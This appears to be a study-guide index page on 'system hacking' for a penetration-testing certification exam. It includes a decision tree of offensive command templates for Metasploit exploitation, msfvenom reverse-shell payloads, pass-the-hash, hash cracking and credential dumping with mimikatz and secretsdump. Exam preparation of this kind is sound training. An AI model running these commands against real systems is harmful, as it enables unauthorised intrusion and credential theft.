# 05 — System Hacking

> The "get a shell, then get SYSTEM/root" domain. Expect 2–4 questions involving exploitation, password cracking, or post-exploitation loot (flags, files, hashes).

## 🧭 Decision tree — "I see a system hacking question"

```
What do you already have?
│
├── Nothing — just an IP + open port
│   ├── Known CVE (e.g. MS17-010, vsftpd 2.3.4)
│   │   └── msfconsole → search <cve> → use → set RHOSTS → exploit
│   └── Unknown service
│       └── searchsploit <service> <version>
│
├── Valid credentials (user:pass)
│   ├── SMB / Windows → crackmapexec smb <IP> -u U -p P
│   ├── WinRM open    → evil-winrm -i <IP> -u U -p P
│   ├── Any Windows   → impacket-psexec U:P@<IP>  /  impacket-wmiexec
│   └── SSH           → ssh U@<IP>
│
├── A hash (NTLM, NetNTLMv2, /etc/shadow, etc.)
│   ├── Crack it  → hashcat -m <mode> hash.txt rockyou.txt
│   │             or john --wordlist=rockyou.txt hash.txt
│   └── Pass-the-hash (NTLM) → crackmapexec smb <IP> -u U -H <hash>
│                            or impacket-psexec -hashes :<NThash> U@<IP>
│
├── Need a payload / reverse shell
│   └── msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <fmt> -o shell.<ext>
│       then start a listener: msfconsole → use multi/handler
│
└── Got a shell, need to escalate
    ├── Linux   → linpeas.sh  →  look for SUID / sudo -l / kernel
    └── Windows → winpeas.exe → look for AlwaysInstallElevated, unquoted paths, creds
```

## 📄 Files in this folder

- **[commands.md](commands.md)** — copy-paste recipes
- **[walkthroughs.md](walkthroughs.md)** — full multi-step examples
- Question bank: **[../questions/05-system-hacking.md](../questions/05-system-hacking.md)**

## 🛠 Tools used in this domain

- **[metasploit](../tools/metasploit.md)** ← the big one
- **[msfvenom](../tools/msfvenom.md)** — payload generation
- **[hydra](../tools/hydra.md)** — online password brute
- **[john](../tools/john.md)** — offline password crack
- **[hashcat](../tools/hashcat.md)** — GPU cracking
- **[mimikatz](../tools/mimikatz.md)** — Windows secrets
- **[impacket](../tools/impacket.md)** — psexec / wmiexec / secretsdump
- **[evil-winrm](../tools/evil-winrm.md)** — WinRM shell
- **[crackmapexec](../tools/crackmapexec.md)** — SMB swiss army knife
- **[linpeas](../tools/linpeas.md)** — Linux privesc enum
- **[winpeas](../tools/winpeas.md)** — Windows privesc enum

## ✅ Domain checklist

- [ ] Launch MS17-010 EternalBlue from msfconsole start-to-finish from memory
- [ ] Generate a Windows reverse-shell exe with msfvenom + catch it with multi/handler
- [ ] Crack an NTLM and a Linux shadow hash with both john and hashcat
- [ ] Pass-the-hash into a box using crackmapexec and impacket-psexec
- [ ] Run linpeas and winpeas and know what findings actually matter
- [ ] Dump hashes with `secretsdump.py` and `mimikatz sekurlsa::logonpasswords`
- [ ] Know the hashcat mode numbers for NTLM (1000), NetNTLMv2 (5600), sha512crypt (1800)
- [ ] Done all questions in [the question bank](../questions/05-system-hacking.md)
